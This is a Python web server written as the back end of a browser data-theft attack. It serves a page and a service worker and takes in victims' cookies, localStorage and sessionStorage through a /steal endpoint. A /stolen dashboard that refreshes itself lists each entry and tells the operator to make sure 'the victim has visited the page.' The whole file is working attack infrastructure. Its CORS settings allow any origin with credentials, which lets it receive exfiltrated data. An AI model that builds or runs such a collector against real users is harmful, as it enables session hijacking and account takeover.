from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time

class RequestHandler(BaseHTTPRequestHandler):
    def _set_cors_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.send_header('Access-Control-Allow-Credentials', 'true')

    def do_OPTIONS(self):
        self.send_response(200)
        self._set_cors_headers()
        self.end_headers()

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            with open('index.html', 'rb') as file:
                self.wfile.write(file.read())
        elif self.path == '/sw.js':
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self.end_headers()
            with open('sw.js', 'rb') as file:
                self.wfile.write(file.read())
        elif self.path == '/stolen':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            # Create HTML to display stolen data
            html = '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Stolen Data</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; }
                    h1 { color: #ff4444; }
                    pre { background-color: #f5f5f5; padding: 10px; border-radius: 5px; }
                    .data-section { margin-bottom: 20px; }
                </style>
            </head>
            <body>
                <h1>Stolen Data</h1>
                <div id="data"></div>
                <script>
                    // Function to display stolen data
                    function displayStolenData() {
                        const dataDiv = document.getElementById('data');
                        
                        // Fetch stolen data from server
                        fetch('/get_stolen_data')
                            .then(response => response.json())
                            .then(data => {
                                if (data && data.length > 0) {
                                    // Display each stolen data entry
                                    data.forEach((entry, index) => {
                                        const entryDiv = document.createElement('div');
                                        entryDiv.className = 'data-section';
                                        entryDiv.innerHTML = `
                                            <h2>Entry ${index + 1} - ${new Date(entry.timestamp).toLocaleString()}</h2>
                                            <p><strong>URL:</strong> ${entry.url}</p>
                                            <p><strong>User Agent:</strong> ${entry.userAgent}</p>
                                            
                                            <h3>Cookies:</h3>
                                            <pre>${entry.cookies || 'No cookies found'}</pre>
                                            
                                            <h3>Local Storage:</h3>
                                            <pre>${JSON.stringify(entry.localStorage || {}, null, 2)}</pre>
                                            
                                            <h3>Session Storage:</h3>
                                            <pre>${JSON.stringify(entry.sessionStorage || {}, null, 2)}</pre>
                                        `;
                                        dataDiv.appendChild(entryDiv);
                                    });
                                } else {
                                    dataDiv.innerHTML = '<p>No stolen data available yet. Make sure the victim has visited the page.</p>';
                                }
                            })
                            .catch(error => {
                                dataDiv.innerHTML = `<p>Error loading stolen data: ${error.message}</p>`;
                            });
                    }
                    
                    // Display data when page loads
                    displayStolenData();
                    
                    // Refresh data every 5 seconds
                    setInterval(displayStolenData, 5000);
                </script>
            </body>
            </html>
            '''
            
            self.wfile.write(html.encode())
        elif self.path == '/get_stolen_data':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(stolen_data).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/steal':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            # Store the stolen data
            stolen_data.append(data)
            
            print("\n=== Stolen Data ===")
            print(f"Time: {data.get('timestamp', 'N/A')}")
            print(f"URL: {data.get('url', 'N/A')}")
            print(f"Response: {data.get('response', 'None')[:200]}...")  # Print first 200 chars
            print("==================\n")
            
            self.send_response(200)
            self._set_cors_headers()
            self.end_headers()
            self.wfile.write(b'Data received')
        else:
            self.send_response(404)
            self.end_headers()

# Global variable to store stolen data
stolen_data = []

if __name__ == '__main__':
    server = HTTPServer(('localhost', 8000), RequestHandler)
    print('Starting server on http://localhost:8000')
    server.serve_forever() 